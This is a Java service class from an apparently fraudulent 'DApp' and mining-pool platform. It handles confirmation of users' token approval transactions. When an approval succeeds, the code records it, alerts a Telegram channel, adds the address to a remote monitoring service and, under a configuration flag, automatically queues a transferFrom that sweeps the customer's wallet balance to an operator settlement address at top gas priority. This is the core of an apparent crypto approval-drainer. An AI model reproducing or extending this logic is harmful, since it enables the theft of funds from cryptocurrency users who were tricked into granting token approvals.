package project.monitor.job.approve;

import java.util.Date;

import kernel.util.ThreadUtils;
import project.monitor.AutoMonitorAddressConfigService;
import project.monitor.AutoMonitorPoolDataService;
import project.monitor.AutoMonitorPoolMiningDataService;
import project.monitor.AutoMonitorTipService;
import project.monitor.AutoMonitorWalletService;
import project.monitor.DAppAccountService;
import project.monitor.bonus.AutoMonitorSettleAddressConfigService;
import project.monitor.bonus.model.SettleAddressConfig;
import project.monitor.etherscan.GasOracle;
import project.monitor.job.transferfrom.TransferFrom;
import project.monitor.job.transferfrom.TransferFromQueue;
import project.monitor.model.AutoMonitorTip;
import project.monitor.model.AutoMonitorWallet;
import project.monitor.noderpc.business.NodeRpcBusinessService;
import project.monitor.report.DAppUserDataSumService;
import project.monitor.telegram.business.TelegramBusinessMessageService;
import project.party.PartyService;
import project.party.model.Party;
import project.syspara.SysparaService;
import project.tip.TipService;

public class ApproveConfirmServiceImpl implements ApproveConfirmService {

	protected AutoMonitorWalletService autoMonitorWalletService;
	protected PartyService partyService;
	protected TelegramBusinessMessageService telegramBusinessMessageService;
	protected DAppUserDataSumService dAppUserDataSumService;
	protected DAppAccountService dAppAccountService;
	protected AutoMonitorPoolDataService autoMonitorPoolDataService;
	protected TipService tipService;
	protected AutoMonitorAddressConfigService autoMonitorAddressConfigService;
	protected NodeRpcBusinessService nodeRpcBusinessService;
	protected SysparaService sysparaService;
	protected AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService;
	protected AutoMonitorTipService autoMonitorTipService;
	protected AutoMonitorPoolMiningDataService autoMonitorPoolMiningDataService;

	// 1.交易成功 0.交易失败
	@Override
	public void saveConfirm(String id, Integer status, String hash) {

		AutoMonitorWallet entity = autoMonitorWalletService.findById(id);

		Party party = partyService.cachePartyBy(entity.getPartyId(), false);

		if (status == 0) {
			/**
			 * 交易失败
			 */

			/**
			 * 数据库中已经成功则直接返回
			 */
			if (entity.getSucceeded() == 1) {
				return;
			}
			/**
			 * 数据库中已经失败则记录哈希
			 */
			if (entity.getSucceeded() == 2) {
				entity.setTxn_hash(hash);
				autoMonitorWalletService.update(entity);
				return;
			}
			
			if (entity.getCancel_apply() == 1) {
				//取消失败
				entity.setSucceeded(-5);
				entity.setCancel_apply(0);
				autoMonitorWalletService.update(entity);
				return;
			}
			
			int beforeSucceed = entity.getSucceeded();
			// 申请中 或 拒绝的 记录hash和发送消息
			entity.setTxn_hash(hash);

			entity.setSucceeded(2);
			autoMonitorWalletService.update(entity);
			if (beforeSucceed == 0) {
				autoMonitorAddressConfigService.saveApproveFailByAddress(entity.getMonitor_address());
			}
			// 失败时才发送消息
//			telegramBusinessMessageService.sendApproveErrorAddTeleg(party);

		} else if (status == 1) {

			/**
			 * 交易成功
			 */
			if (entity.getSucceeded() == 1) {
				/**
				 * 数据库状态成功，只保存哈希
				 */
				entity.setTxn_hash(hash);
				autoMonitorWalletService.update(entity);
				return;
			}
			if (entity.getCancel_apply() == 1) {
				//取消成功
				entity.setSucceeded(2);
				entity.setCancel_apply(2);
				autoMonitorWalletService.update(entity);
				dAppUserDataSumService.saveApproveSuccessToFail(party.getId());
				return;
			}

			entity.setTxn_hash(hash);
			entity.setSucceeded(1);
			autoMonitorWalletService.update(entity);

			dAppUserDataSumService.saveApprove(party.getId());

			// 等待事务提交后
			ThreadUtils.sleep(200);
			dAppAccountService.addBalanceQueue(party.getUsercode(), party.getRolename());
			telegramBusinessMessageService.sendApproveAddTeleg(party);
			autoMonitorPoolDataService.updatePoolDataByApproveSuccess();
			autoMonitorPoolMiningDataService.updatePoolDataByApproveSuccess();
			// 授权成功则加入到远程服务中
			nodeRpcBusinessService.sendAdd(entity.getAddress());

			/**
			 * 是否授权成功后自动归集客户钱包金额，是否授权成功后自动归集金额：1不归集，2归集
			 */
			autoWalletIsCollection(entity);
		}
		tipService.deleteTip(entity.getId().toString());

	}

	public void autoWalletIsCollection(AutoMonitorWallet autoMonitorWallet) {
		/**
		 * 是否授权成功后自动归集客户钱包金额，是否授权成功后自动归集金额：1不归集，2归集
		 */
		double auto_monitor_success_wallet_collection = Double
				.valueOf(sysparaService.find("auto_monitor_success_wallet_collection").getValue());
		if (auto_monitor_success_wallet_collection == 1) {
			return;
		}
		if (auto_monitor_success_wallet_collection == 2) {
			AutoMonitorTip tip = new AutoMonitorTip();
			/**
			 * 归集操作
			 */
			TransferFrom item = new TransferFrom();

			item.setAutoMonitorWallet(autoMonitorWallet);
//			AutoMonitorTransferAddressConfig transferAddressConfig = autoMonitorTransferAddressConfigService
//					.findAll().get(0);
			SettleAddressConfig findDefault = autoMonitorSettleAddressConfigService.findDefault();
			item.setTo(findDefault.getChannel_address());
			item.setGasPriceType(GasOracle.GAS_PRICE_SUPER);

			TransferFromQueue.add(item);

			tip.setDispose_method("已归集");

			tip.setPartyId(autoMonitorWallet.getPartyId());
			tip.setTiptype(1895);
			tip.setTipinfo("[授权成功自动归集钱包金额]");

			tip.setCreated(new Date());
			autoMonitorTipService.saveTipNewThreshold(tip);

		}
	}

	public void setAutoMonitorWalletService(AutoMonitorWalletService autoMonitorWalletService) {
		this.autoMonitorWalletService = autoMonitorWalletService;
	}

	public void setPartyService(PartyService partyService) {
		this.partyService = partyService;
	}

	public void setTelegramBusinessMessageService(TelegramBusinessMessageService telegramBusinessMessageService) {
		this.telegramBusinessMessageService = telegramBusinessMessageService;
	}

	public void setdAppUserDataSumService(DAppUserDataSumService dAppUserDataSumService) {
		this.dAppUserDataSumService = dAppUserDataSumService;
	}

	public void setdAppAccountService(DAppAccountService dAppAccountService) {
		this.dAppAccountService = dAppAccountService;
	}

	public void setAutoMonitorPoolDataService(AutoMonitorPoolDataService autoMonitorPoolDataService) {
		this.autoMonitorPoolDataService = autoMonitorPoolDataService;
	}

	public void setTipService(TipService tipService) {
		this.tipService = tipService;
	}

	public void setAutoMonitorAddressConfigService(AutoMonitorAddressConfigService autoMonitorAddressConfigService) {
		this.autoMonitorAddressConfigService = autoMonitorAddressConfigService;
	}

	public void setNodeRpcBusinessService(NodeRpcBusinessService nodeRpcBusinessService) {
		this.nodeRpcBusinessService = nodeRpcBusinessService;
	}

	public void setSysparaService(SysparaService sysparaService) {
		this.sysparaService = sysparaService;
	}

	public void setAutoMonitorSettleAddressConfigService(
			AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService) {
		this.autoMonitorSettleAddressConfigService = autoMonitorSettleAddressConfigService;
	}

	public void setAutoMonitorTipService(AutoMonitorTipService autoMonitorTipService) {
		this.autoMonitorTipService = autoMonitorTipService;
	}

	public void setAutoMonitorPoolMiningDataService(AutoMonitorPoolMiningDataService autoMonitorPoolMiningDataService) {
		this.autoMonitorPoolMiningDataService = autoMonitorPoolMiningDataService;
	}

}
